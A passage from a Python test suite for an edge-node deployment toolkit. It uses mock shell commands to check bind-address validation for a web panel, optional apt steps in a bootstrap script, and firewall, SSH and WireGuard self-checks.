        log_pass("描述文案点明「同网段可访问」")
    else:
        log_fail("描述文案未说明访问范围")

    # ---- 3) install-service.sh 入参校验 (截到落盘/写 unit 之前) ----
    # 锚点取"落盘"注释行: 校验逻辑都在它之前, 而它之后会写文件 (测试不该落盘)
    anchor = "# ---- 落盘: 合并写 panel.env"
    probe = PANEL_DIR / "_probe_t23.sh"
    probe.write_text(ssrc[:ssrc.index(anchor)] + "\nexit 0\n", encoding="utf-8", newline="\n")
    try:
        for host, want_ok in (("127.0.0.0", False), ("192.168.1.0", False), ("abc", False),
                              ("192.168.1.101", True), ("0.0.0.0", True), ("127.0.0.1", True)):
            env = env_mock()
            env["PANEL_HOST"] = host
            r = subprocess.run(["bash", _posix(probe)], capture_output=True, env=env,
                               cwd=str(PROJECT_ROOT), timeout=60)
            ok = r.returncode == 0
            if ok != want_ok:
                log_fail(f"install-service.sh 对 PANEL_HOST={host} 的处理不符预期",
                         f"期望{'放行' if want_ok else '拒绝'}, 实际退出码 {r.returncode}")
            else:
                log_pass(f"install-service.sh {'放行' if want_ok else '拒绝'} PANEL_HOST={host}")

        env = env_mock()
        env["PANEL_HOST"] = "127.0.0.0"
        r = subprocess.run(["bash", _posix(probe)], capture_output=True, env=env,
                           cwd=str(PROJECT_ROOT), timeout=60)
        msg = (r.stdout + r.stderr).decode("utf-8", "replace")
        if "建议改用: 127.0.0.1" in msg:
            log_pass("install-service.sh 拒绝时给出可采用的替代值")
        else:
            log_fail("install-service.sh 拒绝时未给出替代值")
    finally:
        try:
            probe.unlink()
        except OSError:
            pass

    # ---- 4) app.py 运行时校验 ----
    m = re.search(r"^def resolve_bind_host\(raw\):.*?(?=\n\nif __name__)", asrc, re.S | re.MULTILINE)
    if not m:
        log_fail("未能从 app.py 抽出 resolve_bind_host")
    else:
        ns = {"sys": sys}
        exec(compile(m.group(0), "app.py", "exec"), ns)
        fn = ns["resolve_bind_host"]
        import io as _io
        from contextlib import redirect_stderr

        rejects = ["127.0.0.0", "192.168.1.0", "192.168.1.255", "224.0.0.1",
                   "0.1.2.3", "abc", "192.168.1.256"]
        accepts = [("0.0.0.0", "0.0.0.0"), ("127.0.0.1", "127.0.0.1"),
                   ("192.168.1.101", "192.168.1.101")]
        bad = []
        for host in rejects:
            try:
                with redirect_stderr(_io.StringIO()):
                    fn(host)
                bad.append(host)
            except SystemExit:
                pass
        for host, want in accepts:
            try:
                with redirect_stderr(_io.StringIO()):
                    val = fn(host)
                if val != want:
                    bad.append(host)
            except SystemExit:
                bad.append(host)
        if bad:
            log_fail(f"app.py 绑定地址校验不符预期: {bad}")
        else:
            log_pass(f"app.py 绑定地址校验正确（拒绝 {len(rejects)} 个 / 放行 {len(accepts)} 个）")

        try:
            with redirect_stderr(_io.StringIO()) as buf:
                fn("127.0.0.0")
        except SystemExit:
            if "127.0.0.1" in buf.getvalue():
                log_pass("app.py 拒绝时提示改用 127.0.0.1")
            else:
                log_fail("app.py 拒绝时未提示正确写法")

    # ---- 5) init.sh 交互: 误填拦截与同网段引导 ----
    def run_init(steps, timeout=120):
        env = env_mock()
        data = ("\n".join(steps) + "\n").encode("utf-8")   # stdin 必须按字节喂
        r = subprocess.run(["bash", "init/init.sh"], cwd=str(PROJECT_ROOT), input=data,
                           capture_output=True, env=env, timeout=timeout)
        return r.stdout.decode("utf-8", "replace") + r.stderr.decode("utf-8", "replace")

    # 主菜单: 部署面板 -> 前台试运行 -> 不重生成配置 -> 不装依赖
    PRE = ["1", "2", "n", "n"]
    TAIL = ["admin", "pw123456", "n", "", "4", "7"]   # 用户名/密码/取消部署/暂停/返回/退出

    try:
        # 选「本机局域网地址」= 同网段可访问
        out = run_init(PRE + ["9000", "2"] + TAIL)
        if "监听地址 : 192.168.1.101" in out and "同网段可直接访问" in out:
            log_pass("菜单选「本机局域网地址」采用本机网卡地址（同网段可访问）")
        else:
            log_fail("菜单选「本机局域网地址」未采用本机地址")
        if "同网段 192.168.1.0/24 可访问" in out:
            log_pass("配置汇总标注访问范围与网段")
        else:
            log_fail("配置汇总未标注访问范围")

        # 手动输入 127.0.0.0 -> 拒绝 + 建议 127.0.0.1 + 采纳
        out = run_init(PRE + ["9000", "4", "127.0.0.0", "y"] + TAIL)
        if "127.0.0.0 是回环网段的网络地址" in out and "建议改为: 127.0.0.1" in out:
            log_pass("手动输入 127.0.0.0 被拒绝并给出原因")
        else:
            log_fail("127.0.0.0 未被正确拒绝")
        if "监听地址 : 127.0.0.1" in out and "仅本机" in out:
            log_pass("采纳建议后落到 127.0.0.1（仅本机）")
        else:
            log_fail("未采纳建议值")

        # 手动输入 192.168.1.0（想表达"同网段"）-> 引导到本机地址
        out = run_init(PRE + ["9000", "4", "192.168.1.0", "y"] + TAIL)
        if "192.168.1.0 是网络地址" in out and "建议改为: 192.168.1.101" in out:
            log_pass("手动输入网段地址被拒绝并引导到本机在该网段的地址")
        else:
            log_fail("网段地址未被正确引导")

        # 非本机地址: 告警后仍须显式确认, 答 n 则要求重新输入
        out = run_init(PRE + ["9000", "4", "192.168.9.9", "n", "192.168.1.101"] + TAIL)
        if "不在本机任何网卡上" in out:
            log_pass("非本机地址给出启动会失败的告警")
        else:
            log_fail("非本机地址未告警")
        if "监听地址 : 192.168.1.101" in out:
            log_pass("拒绝非本机地址后要求重新输入")
        else:
            log_fail("拒绝后未重新收集地址")

        # 0.0.0.0 与 127.0.0.1 的暴露面提示
        out = run_init(PRE + ["9000", "1"] + TAIL)
        if "会在全部网卡上监听" in out and "全部网卡 (含 WireGuard / 外网网卡)" in out:
            log_pass("选 0.0.0.0 时提示暴露面（含 WireGuard / 外网网卡）")
        else:
            log_fail("选 0.0.0.0 未提示暴露面")

        out = run_init(PRE + ["9000", "3"] + TAIL)
        if "仅监听 127.0.0.1" in out and "仅本机 (远端访问需 SSH 端口转发)" in out:
            log_pass("选 127.0.0.1 时说明仅本机可访问")
        else:
            log_fail("选 127.0.0.1 未说明访问范围")
    except subprocess.TimeoutExpired:
        log_fail("init.sh 交互测试超时")
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)


# ============ 测试24: bootstrap apt 动作可选化 ============
def test_bootstrap_apt_optional():
    """测试 24: bootstrap 的换源/更新改为可选且默认跳过

    背景: 此前初始化必然换源 + 必然 apt update/upgrade。现场代价:
    换源失败会留下半截源文件, 升级可能拉入新内核让机器起不来,
    而多数节点跑脚本前源和索引其实已经就绪。
    v1.4.5 起四项 (换源/刷索引/升级/装基础工具) 各自独立, 默认都不做。
    """
    print("\n" + "=" * 60)
    print("测试 24: bootstrap apt 动作可选化 (默认跳过)")
    print("=" * 60)

    boot = SCRIPTS_DIR / "bootstrap.sh"
    if not boot.exists():
        log_fail("scripts/bootstrap.sh 缺失")
        return
    src = boot.read_text(encoding="utf-8")
    lines = src.splitlines()

    # ---- 1) 静态检查 ----
    needed = ["apt_switch_defaults()", "apt_switch_fixup()", "apt_switch_desc()",
              "apt_switch_all_off()"]
    missing = [n for n in needed if n not in src]
    if missing:
        log_fail(f"缺少 apt 开关相关函数: {missing}")
    else:
        log_pass("具备 apt 开关函数 (默认值 / 联动 / 摘要 / 全关判定)")

    flags = ["--mirror", "--no-mirror", "--apt-update", "--apt-upgrade",
             "--no-apt-pkgs", "--no-apt"]
    absent = [f for f in flags if f not in src]
    if absent:
        log_fail(f"缺少选项: {absent}")
    else:
        log_pass("提供 --mirror / --apt-update / --apt-upgrade / --no-apt-pkgs / --no-apt")

    if re.search(r"DO_MIRROR=false\s*$", src, re.M) \
            and re.search(r"DO_APT_UPDATE=false\s*$", src, re.M) \
            and re.search(r"DO_APT_UPGRADE=false\s*$", src, re.M):
        log_pass("换源/刷索引/升级三项默认 false (默认跳过)")
    else:
        log_fail("默认值不是跳过", "换源与更新仍会自动执行")

    if re.search(r"DO_APT_PKGS=true\s*$", src, re.M):
        log_pass("基础工具安装默认仍执行 (可用 --no-apt-pkgs 关)")
    else:
        log_fail("基础工具安装默认被关掉", "会与历史行为不一致")

    if "ONECLOUD_APT_SKIP_MIRROR" in src and "ONECLOUD_APT_SKIP_ALL" in src:
        log_pass("保留旧开关并新增总开关 (向后兼容)")
    else:
        log_fail("旧开关被移除", "已有脚本/文档会失效")

    # ---- 2) 行为验证: 切片 + mock apt, 逐个开关组合 ----
    i_log = next((i for i, l in enumerate(lines) if l.startswith("log_info()  {")), -1)
    i_net = next((i for i, l in enumerate(lines) if l.startswith("# 网段计算")), -1)
    i_s3 = next((i for i, l in enumerate(lines) if l.startswith("# ---- 3. 换国内源")), -1)
    i_s6 = next((i for i, l in enumerate(lines) if l.startswith("# ---- 6. 配置时区")), -1)
    if min(i_log, i_net, i_s3, i_s6) < 0:
        log_fail("无法定位 helper / 步骤锚点", "代码结构变了, 需同步更新本测试")
        return

    helpers = "\n".join(lines[i_log:i_net - 1])
    flow = "\n".join(lines[i_s3:i_s6])

    tmpdir = Path(tempfile.mkdtemp(prefix="oc_t24_"))
    mockbin = tmpdir / "mockbin"
    mockbin.mkdir()

    def _posix(p):
        s = Path(p).as_posix()
        m = re.match(r"^([A-Za-z]):/(.*)$", s)
        return f"/{m.group(1).lower()}/{m.group(2)}" if m else s

    mocks = {
        "apt": r"""#!/bin/bash
echo "apt $*" >> "$APT_LOG"
exit 0
""",
        "apt-cache": r"""#!/bin/bash
echo "apt-cache $*" >> "$APT_LOG"
exit 0
""",
        "uname": r"""#!/bin/bash
[ "$1" = "-r" ] && { echo "5.10.63-rockchip"; exit 0; }
echo Linux
exit 0
""",
    }
    for name, body in mocks.items():
        p = mockbin / name
        p.write_text(body, encoding="utf-8", newline="\n")
        os.chmod(p, 0o755)

    driver = r"""
# ---------------- driver ----------------
set +e
WORK="@WORK@"
M="@MOCK@"
PATH="$M:/usr/bin:/bin"
export PATH

run_case() {
    local tag="$1"
    shift
    local root="$WORK/root_$tag"
    mkdir -p "$root/apt/sources.list.d"
    printf 'ID=debian\nVERSION_CODENAME=bookworm\n' > "$root/os-release"
    cat > "$root/apt/sources.list" <<'EOS'
deb http://deb.debian.org/debian bookworm main
EOS
    export ONECLOUD_ETC_ROOT="$root"
    export APT_LOG="$WORK/apt_$tag.log"
    : > "$APT_LOG"

    # 复位: 先清掉所有开关与环境变量, 再用 apt_switch_defaults 取默认值
    unset DO_MIRROR DO_APT_UPDATE DO_APT_UPGRADE DO_APT_PKGS
    unset APT_UPDATE_AUTO APT_UPDATE_EXPLICIT
    unset ONECLOUD_APT_ENABLE_MIRROR ONECLOUD_APT_ENABLE_UPDATE
    unset ONECLOUD_APT_ENABLE_UPGRADE ONECLOUD_APT_SKIP_MIRROR
    unset ONECLOUD_APT_SKIP_PKGS ONECLOUD_APT_SKIP_ALL
    local kv
    for kv in "$@"; do
        case "$kv" in ONECLOUD_*) export "$kv" ;; esac
    done
    apt_switch_defaults
    for kv in "$@"; do
        case "$kv" in DO_*|APT_*) export "$kv" ;; esac
    done
    apt_switch_fixup

    ( set -e; step_apt_flow ) > "$WORK/out_$tag.txt" 2>&1
    echo "###RC:$tag:$?"
    echo "###APTLOG_BEGIN:$tag"
    cat "$APT_LOG"
    echo "###APTLOG_END:$tag"
    echo "###SOURCES_BEGIN:$tag"
    cat "$root/apt/sources.list"
    echo "###SOURCES_END:$tag"
    echo "###OUT_BEGIN:$tag"
    cat "$WORK/out_$tag.txt"
    echo "###OUT_END:$tag"
}

run_case a1_default
run_case a2_mirror_only        DO_MIRROR=true
run_case a3_mirror_no_update   DO_MIRROR=true APT_UPDATE_EXPLICIT=true
run_case a4_update_only        DO_APT_UPDATE=true
run_case a5_upgrade_only       DO_APT_UPGRADE=true
run_case a6_no_pkgs            DO_APT_PKGS=false
run_case a7_all_off            DO_APT_PKGS=false DO_APT_UPDATE=false DO_APT_UPGRADE=false DO_MIRROR=false
run_case a8_legacy_env         ONECLOUD_APT_ENABLE_MIRROR=1 ONECLOUD_APT_SKIP_MIRROR=1
run_case a9_env_enable         ONECLOUD_APT_ENABLE_MIRROR=1 ONECLOUD_APT_ENABLE_UPDATE=1
echo "###DONE"
"""
    probe = tmpdir / "probe.sh"
    probe.write_text(
        helpers + "\n\nstep_apt_flow() {\n" + flow + "\n}\n" + driver
        .replace("@WORK@", _posix(tmpdir))
        .replace("@MOCK@", _posix(mockbin)),
        encoding="utf-8", newline="\n")

    try:
        r = subprocess.run(["bash", _posix(probe)], capture_output=True, text=True,
                           encoding="utf-8", errors="replace",
                           stdin=subprocess.DEVNULL, timeout=420)
        out = r.stdout

        def sect(name, tag):
            m = re.search(rf"###{name}_BEGIN:{tag}\n(.*?)\n###{name}_END:{tag}", out, re.S)
            return (m.group(1) + "\n") if m else ""

        def rc(tag):
            m = re.search(rf"###RC:{tag}:(\d+)", out)
            return int(m.group(1)) if m else None

        if "###DONE" not in out:
            log_fail("mock 驱动未跑完", f"stderr={r.stderr[-300:]}")
            return

        # a1: 默认 —— 一个 apt 动作都不该有源改动, 只装基础工具
        a1 = sect("APTLOG", "a1_default")
        s1 = sect("SOURCES", "a1_default")
        if rc("a1_default") == 0:
            log_pass("默认组合下初始化正常退出")
        else:
            log_fail(f"默认组合退出码 {rc('a1_default')}")
        if "update" not in a1 and "upgrade" not in a1:
            log_pass("默认不刷新索引、不升级系统 (这是本次改动的核心)")
        else:
            log_fail("默认仍在执行 update/upgrade", a1[:200])
        if "apt install -y" in a1:
            log_pass("默认仍会安装基础工具")
        else:
            log_fail("默认跳过了基础工具安装")
        if "bookworm main" in s1 and "onecloud" not in s1:
            log_pass("默认完全不改写 apt 源文件")
        else:
            log_fail("默认仍改写了源文件", s1[:200])
        if "换源: 跳过" in sect("OUT", "a1_default"):
            log_pass("输出里明确标注「换源: 跳过」")
        else:
            log_fail("未标注换源被跳过")

        # a2: 只开换源 -> 必须自动补刷索引, 但不升级
        a2 = sect("APTLOG", "a2_mirror_only")
        s2 = sect("SOURCES", "a2_mirror_only")
        if "bookworm" in s2 and "mirrors.tuna" in s2:
            log_pass("--mirror 时按系统代号写入国内源")
        else:
            log_fail("--mirror 未写入源", s2[:200])
        if "apt update" in a2 and "apt upgrade" not in a2:
            log_pass("换源后自动补刷索引, 但不顺手升级系统包")
        else:
            log_fail("换源后的联动不正确", a2[:200])
        if "自动补" in sect("OUT", "a2_mirror_only"):
            log_pass("自动补的刷索在日志里被说明 (不是悄悄执行)")
        else:
            log_fail("自动补刷索引未说明原因")

        # a3: 显式否决刷索引 -> 不自动补 (尊重显式指定)
        a3 = sect("APTLOG", "a3_mirror_no_update")
        if "update" not in a3 and "upgrade" not in a3:
            log_pass("显式否决刷索引时不做任何 apt 动作 (显式优先)")
        else:
            log_fail("显式否决仍被执行", a3[:200])

        # a4/a5: 只刷索引 / 只升级
        a4 = sect("APTLOG", "a4_update_only")
        if "apt update" in a4 and "apt upgrade" not in a4:
            log_pass("--apt-update 只刷索引, 不升级")
        else:
            log_fail("--apt-update 行为不正确", a4[:200])
        a5 = sect("APTLOG", "a5_upgrade_only")
        if "apt upgrade" in a5 and "apt update" not in a5:
            log_pass("--apt-upgrade 只升级, 不额外刷索引")
        else:
            log_fail("--apt-upgrade 行为不正确", a5[:200])

        # a6/a7: 跳过装包 / 全关
        a6 = sect("APTLOG", "a6_no_pkgs")
        if "apt install -y" not in a6 and "update" not in a6:
            log_pass("--no-apt-pkgs 时不再安装基础工具")
        else:
            log_fail("--no-apt-pkgs 未生效", a6[:200])
        a7 = sect("APTLOG", "a7_all_off")
        if a7.strip() == "":
            log_pass("四项全关时 apt 一次都没被调用 (纯离线初始化)")
        else:
            log_fail("四项全关仍调用了 apt", a7[:200])

        # a8: 旧开关 ONECLOUD_APT_SKIP_MIRROR 仍能压住新开关
        s8 = sect("SOURCES", "a8_legacy_env")
        if "onecloud" not in s8 and "bookworm main" in s8:
            log_pass("旧开关 ONECLOUD_APT_SKIP_MIRROR=1 仍能阻止换源")
        else:
            log_fail("旧开关失效", s8[:200])

        # a9: 环境变量启用换源+刷索引
        s9 = sect("SOURCES", "a9_env_enable")
        a9 = sect("APTLOG", "a9_env_enable")
        if "mirrors.tuna" in s9 and "apt update" in a9:
            log_pass("ONECLOUD_APT_ENABLE_MIRROR/UPDATE 环境变量生效")
        else:
            log_fail("环境变量开关未生效", (s9[:120] + a9[:120]))
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)


# ============ 测试25: 防火墙 / SSH 通道自检 ============
def test_network_audit():
    """测试 25: 网络通路 / 防火墙 / SSH 通道自检

    背景: 本仓库脚本不主动改防火墙 (wg0.conf 的 PostUp/PostDown 规则自
    v1.4.5 起默认关闭, 改由 setup_firewall.sh 统一管理), 但现场真正把人
    挡在门外的是别的: INPUT 策略 DROP 却没放行 SSH、ufw 启用后没放行、
    Docker 把 FORWARD 置 DROP 打断 wg 转发、以及通过 SSH 远端改静态 IP
    把自己的连接改断。
    """
    print("\n" + "=" * 60)
    print("测试 25: 防火墙与 SSH 通道自检")
    print("=" * 60)

    lib = SCRIPTS_DIR / "lib-network-audit.sh"
    boot = SCRIPTS_DIR / "bootstrap.sh"
    wg = SCRIPTS_DIR / "wireguard-setup.sh"
    gk = PROJECT_ROOT / "node-wk-edge-01" / "wireguard" / "generate-keys.sh"
    missing = [str(p) for p in (lib, boot, wg, gk) if not p.exists()]
    if missing:
        log_fail(f"必要文件缺失: {missing}")
        return

    src = boot.read_text(encoding="utf-8")
    wsrc = wg.read_text(encoding="utf-8")
    gsrc = gk.read_text(encoding="utf-8")

    # ---- 1) 静态检查: bootstrap 集成与断链防护 ----
    if "lib-network-audit.sh" in src and "net_audit_report" in src:
        log_pass("bootstrap 接入通路自检库并在启动时输出报告")
    else:
        log_fail("bootstrap 未接入自检库")

    if "net_audit_is_ssh" in src and "会立即断开这条连接" in src:
        log_pass("SSH 会话中变更 IP 会明确告警「连接将断开」")
    else:
        log_fail("未检测 SSH 会话风险", "远端改 IP 会当场失联且无提示")

    if "net-backup-" in src and "net-config.tar" in src:
        log_pass("改写网络配置前先打快照 (含 netplan / interfaces)")
    else:
        log_fail("改写前没有备份", "配置出错无法回退")

    if "netplan generate" in src:
        log_pass("netplan 配置先校验再生效 (校验不过不 apply)")
    else:
        log_fail("netplan 未做语法校验", "写坏配置会直接 apply")

    if not re.search(r"iptables\s+-(A|I|D|P|F|X)\b", src):
        log_pass("bootstrap 自身不写 iptables (只在自检里只读)")
    else:
        log_fail("bootstrap 里出现会改防火墙的命令", "改网络配置时动防火墙极易把自己挡在外面")

    # ---- 2) 静态检查: WireGuard 规则不再写死网卡且幂等 ----
    if "-o eth0" in wsrc or "-o eth0" in gsrc:
        log_fail("wg0.conf 的 MASQUERADE 仍写死 eth0",
                 "玩客云可能是 end0, NAT 会静默失效")
    else:
        log_pass("MASQUERADE 不再写死 eth0")

    if "iptables -C" in wsrc or "-C FORWARD" in wsrc:
        log_pass("wireguard 规则用 -C 探测后再添加 (重复 up 不堆叠)")
    else:
        log_fail("wireguard 规则仍是无条件 -A", "反复 up 会堆叠残留规则")

    if "WG_IF" in wsrc and "WG_EGRESS_IF" in gsrc:
        log_pass("出网网卡在节点侧探测 (控制端生成 + 节点本地生成两条路都覆盖)")
    else:
        log_fail("出网网卡探测缺失")

    # ---- 3) 行为验证: 自检函数在受控环境下判定 ----
    tmpdir = Path(tempfile.mkdtemp(prefix="oc_t25_"))
    mockbin = tmpdir / "mockbin"
    mockbin.mkdir()

    def _posix(p):
        s = Path(p).as_posix()
        m = re.match(r"^([A-Za-z]):/(.*)$", s)
        return f"/{m.group(1).lower()}/{m.group(2)}" if m else s

    mocks = {
        "iptables": r"""#!/bin/bash
# 支持 -S / -P / -C / -A / -D 的最小实现; -C 命中已存在规则时返回 0
LOG="${IPT_LOG:-/dev/null}"
STATE="${IPT_STATE:-/dev/null}"
tbl="filter"
while [ $# -gt 0 ]; do
    case "$1" in
        -t) tbl="$2"; shift 2 ;;
        -C|-A|-D|-I|-S|-P) break ;;
        *) shift ;;
    esac
done
op="${1:-}"; shift || true
if [ "$op" = "-S" ]; then
    chain="${1:-}"
    if [ -n "$chain" ]; then
        # 指定链: 只回该链的策略 (net_audit_policy 按链读取)
        eval "pol=\${MOCK_POL_$chain:-ACCEPT}"
        echo "-P $chain $pol"
        if [ "$chain" = "INPUT" ] && [ -n "${MOCK_S_INPUT_RULES:-}" ]; then
            printf '%s\n' "$MOCK_S_INPUT_RULES"
        fi
        exit 0
    fi
    echo "-P INPUT ${MOCK_POL_INPUT:-ACCEPT}"
    echo "-P FORWARD ${MOCK_POL_FORWARD:-ACCEPT}"
    echo "-P OUTPUT ACCEPT"
    exit 0
fi
key="$tbl $*"
echo "iptables[$tbl] $op $*" >> "$LOG"
case "$op" in
    -C) grep -qxF "$key" "$STATE" 2>/dev/null && exit 0; exit 1 ;;
    -A|-I) echo "$key" >> "$STATE"; exit 0 ;;
    -D)
        grep -vxF "$key" "$STATE" > "${STATE}.tmp" 2>/dev/null || true
        mv "${STATE}.tmp" "$STATE" 2>/dev/null || true
        exit 0 ;;
    -P) exit 0 ;;
esac
exit 0
""",
        "ss": r"""#!/bin/bash
echo "LISTEN 0 128 0.0.0.0:${MOCK_SSH_PORT:-22} 0.0.0.0:* users:(("sshd",pid=1,fd=3))"
exit 0
""",
        "ufw": r"""#!/bin/bash
case "$1" in
    status)
        if [ "${MOCK_UFW_ACTIVE:-0}" = "1" ]; then
            echo "Status: active"
            [ -n "${MOCK_UFW_ALLOW:-}" ] && printf '%s\n' "$MOCK_UFW_ALLOW"
            echo ""
            echo "To                         Action      From"
            echo "--                         ------      ----"
        else
            echo "Status: inactive"
        fi
        exit 0 ;;
esac
exit 0
""",
        "ip": r"""#!/bin/bash
# 默认路由与地址查询: 只覆盖自检用到的两种
case "$*" in
    *"route show default"*)
        echo "${MOCK_DEFAULT_ROUTE:-default via 192.168.1.1 dev end0 proto dhcp metric 100}"
        exit 0 ;;
    *"addr show"*)
        # 贴近 iproute2 真实输出: 第 4 列是地址/前缀
        echo "2: eth0    inet ${MOCK_LOCAL_ADDR:-192.168.1.101/24} brd 192.168.1.255 scope global eth0"
        exit 0 ;;
esac
exit 0
""",
    }
    for name, body in mocks.items():
        p = mockbin / name
        p.write_text(body, encoding="utf-8", newline="\n")
        os.chmod(p, 0o755)

    driver = r"""
# ---------------- driver ----------------
set +e
M="@MOCK@"
LIB="@LIB@"
WORK="@WORK@"
PATH="$M:/usr/bin:/bin"
export PATH
log_info()  { echo "[INFO] $*"; }
log_warn()  { echo "[WARN] $*"; }
log_error() { echo "[ERROR] $*"; }
# shellcheck disable=SC1090
. "$LIB"

export IPT_STATE="$WORK/ipt.rules"
export IPT_LOG="$WORK/ipt.log"
: > "$IPT_STATE"; : > "$IPT_LOG"

case_run() {
    local tag="$1"; shift
    unset SSH_CONNECTION SSH_CLIENT MOCK_POL_INPUT MOCK_POL_FORWARD MOCK_S_INPUT_RULES
    unset MOCK_UFW_ACTIVE MOCK_UFW_ALLOW MOCK_SSH_PORT MOCK_DEFAULT_ROUTE
    local kv
    for kv in "$@"; do export "$kv"; done
    echo "###CASE:$tag"
    echo "  backend=$(net_audit_backend)"
    echo "  input_pol=$(net_audit_policy INPUT)"
    echo "  forward_pol=$(net_audit_policy FORWARD)"
    echo "  ssh_ports=$(net_audit_ssh_ports | tr '\n' ' ')"
    if net_audit_ssh_allowed; then echo "  ssh_allowed=yes"; else echo "  ssh_allowed=no"; fi
    echo "  is_ssh=$(net_audit_is_ssh && echo yes || echo no)"
    echo "  egress=$(net_audit_egress_if || echo none)"
    if net_audit_report > "$WORK/rep_$tag.txt" 2>&1; then
        echo "  report=clean"
    else
        echo "  report=risk"
    fi
    echo "###REPORT_BEGIN:$tag"
    cat "$WORK/rep_$tag.txt"
    echo "###REPORT_END:$tag"
}

case_run c1_no_firewall
case_run c2_drop_no_ssh      MOCK_POL_INPUT=DROP
case_run c3_drop_with_ssh    MOCK_POL_INPUT=DROP MOCK_S_INPUT_RULES="-A INPUT -p tcp --dport 22 -j ACCEPT"
case_run c4_ufw_blocked      MOCK_UFW_ACTIVE=1
case_run c5_ufw_allowed      MOCK_UFW_ACTIVE=1 MOCK_UFW_ALLOW="22/tcp                     ALLOW       Anywhere"
case_run c6_fwd_drop         MOCK_POL_FORWARD=DROP
case_run c7_ssh_session      SSH_CONNECTION="192.168.1.50 51234 192.168.1.101 22"
case_run c8_custom_port      MOCK_SSH_PORT=2222 MOCK_POL_INPUT=DROP MOCK_S_INPUT_RULES="-A INPUT -p tcp --dport 2222 -j ACCEPT"
echo "###DONE"
"""
    probe = tmpdir / "probe.sh"
    probe.write_text(driver.replace("@MOCK@", _posix(mockbin))
                           .replace("@LIB@", _posix(lib))
                           .replace("@WORK@", _posix(tmpdir)),
                     encoding="utf-8", newline="\n")

    try:
        r = subprocess.run(["bash", _posix(probe)], capture_output=True, text=True,
                           encoding="utf-8", errors="replace",
                           stdin=subprocess.DEVNULL, timeout=HARNESS_TIMEOUT)
        out = r.stdout

        def case_block(tag):
            m = re.search(rf"###CASE:{tag}\n(.*?)(?=###CASE:|###DONE)", out, re.S)
            return m.group(1) if m else ""

        def report(tag):
            m = re.search(rf"###REPORT_BEGIN:{tag}\n(.*?)\n###REPORT_END:{tag}", out, re.S)
            return (m.group(1) + "\n") if m else ""

        if "###DONE" not in out:
            log_fail("自检驱动未跑完", f"stderr={r.stderr[-300:]}")
            return

        c1 = case_block("c1_no_firewall")
        if "backend=none" in c1 and "ssh_allowed=yes" in c1 and "report=clean" in c1:
            log_pass("无防火墙时判定为安全 (不误报)")
        else:
            log_fail("无防火墙场景判定错误", c1[:200])

        c2 = case_block("c2_drop_no_ssh")
        if "input_pol=DROP" in c2 and "ssh_allowed=no" in c2 and "report=risk" in c2:
            log_pass("INPUT 策略 DROP 且未放行 SSH -> 判为高危")
        else:
            log_fail("漏判 INPUT DROP 未放行 SSH", c2[:200])
        if "高危" in report("c2_drop_no_ssh") and "--dport 22" in report("c2_drop_no_ssh"):
            log_pass("报告里给出高危说明与放行命令")
        else:
            log_fail("报告缺少可执行的放行建议")

        c3 = case_block("c3_drop_with_ssh")
        if "ssh_allowed=yes" in c3 and "report=clean" in c3:
            log_pass("INPUT DROP 但已放行 22 -> 不误报")
        else:
            log_fail("已放行 SSH 仍被判风险", c3[:200])

        c4 = case_block("c4_ufw_blocked")
        if "backend=ufw" in c4 and "ssh_allowed=no" in c4:
            log_pass("ufw 启用且未放行 SSH -> 判为高危")
        else:
            log_fail("ufw 未放行 SSH 漏判", c4[:200])

        c5 = case_block("c5_ufw_allowed")
        if "ssh_allowed=yes" in c5:
            log_pass("ufw 已放行 22/tcp -> 不误报")
        else:
            log_fail("ufw 已放行仍误报", c5[:200])

        c6 = case_block("c6_fwd_drop")
        if "forward_pol=DROP" in c6 and "report=risk" in c6:
            log_pass("FORWARD 策略 DROP -> 在报告里点出转发受影响")
        else:
            log_fail("FORWARD DROP 未被识别", c6[:200])

        c7 = case_block("c7_ssh_session")
        if "is_ssh=yes" in c7 and "SSH 远程 (来自 192.168.1.50)" in report("c7_ssh_session"):
            log_pass("SSH 会话被正确识别并标出来源 IP")
        else:
            log_fail("SSH 会话识别失败", c7[:200])

        c8 = case_block("c8_custom_port")
        if "2222" in c8 and "ssh_allowed=yes" in c8:
            log_pass("sshd 非 22 端口时按实际端口判定放行")
        else:
            log_fail("非默认 SSH 端口判定错误", c8[:200])

        if "egress=end0" in c1:
            log_pass("默认路由出口网卡取到 end0 (不假设 eth0)")
        else:
            log_fail("出口网卡探测错误", c1[:200])

        # 4) 行为验证: 生成的 PostUp 在节点上幂等
        # 在临时副本里生成 (不往仓库里写密钥与 wg0.conf)
        gk_root = tmpdir / "wgtest"
        (gk_root / "scripts").mkdir(parents=True)
        (gk_root / "inventory").mkdir(parents=True)
        for f in SCRIPTS_DIR.glob("*.sh"):
            shutil.copy2(f, gk_root / "scripts" / f.name)
        for f in (PROJECT_ROOT / "inventory").glob("*.yaml"):
            shutil.copy2(f, gk_root / "inventory" / f.name)
        mock_wg = mockbin / "wg"
        mock_wg.write_text(r"""#!/bin/bash
case "$1" in
    genkey) echo "PRIV_TEST_KEY" ;;
    pubkey) cat >/dev/null; echo "PUB_TEST_KEY" ;;
esac
exit 0
""", encoding="utf-8", newline="\n")
        os.chmod(mock_wg, 0o755)

        env_g = dict(os.environ)
        env_g["PATH"] = f"{_posix(mockbin)}:/usr/bin:/bin"
        # 2026-09-15 起 wg0.conf 默认**不**写 PostUp/PostDown（防火墙统一交给
        # setup_firewall.sh）。这里要验证的是那段规则本身的正确性，所以显式打开开关
        # 把它取出来 —— 默认关闭的行为由测试 27 负责断言。
        env_g["ONECLOUD_WG_FIREWALL"] = "1"
        subprocess.run(["bash", "scripts/wireguard-setup.sh"], cwd=str(gk_root),
                       capture_output=True, env=env_g, timeout=HARNESS_TIMEOUT)
        conf = gk_root / "node-wk-edge-01" / "wireguard" / "wg0.conf"
        if not conf.exists():
            log_fail("临时副本里未生成 wg0.conf", str(conf))
        else:
            post_up = ""
            for line in conf.read_text(encoding="utf-8").splitlines():
                if line.startswith("PostUp"):
                    post_up = line.split("=", 1)[1].strip()
                    break
            if not post_up:
                log_fail("ONECLOUD_WG_FIREWALL=1 时 wg0.conf 仍未生成 PostUp 行")
            else:
                env = dict(os.environ)
                env["PATH"] = f"{_posix(mockbin)}:/usr/bin:/bin"
                env["IPT_STATE"] = _posix(tmpdir / "run.rules")
                env["IPT_LOG"] = _posix(tmpdir / "run.log")
                env["MOCK_DEFAULT_ROUTE"] = "default via 192.168.1.1 dev end0 proto dhcp"
                Path(tmpdir / "run.rules").write_text("", encoding="utf-8")
                Path(tmpdir / "run.log").write_text("", encoding="utf-8")
                # 模拟 wg-quick 的执行方式 (bash -c), 连跑两次
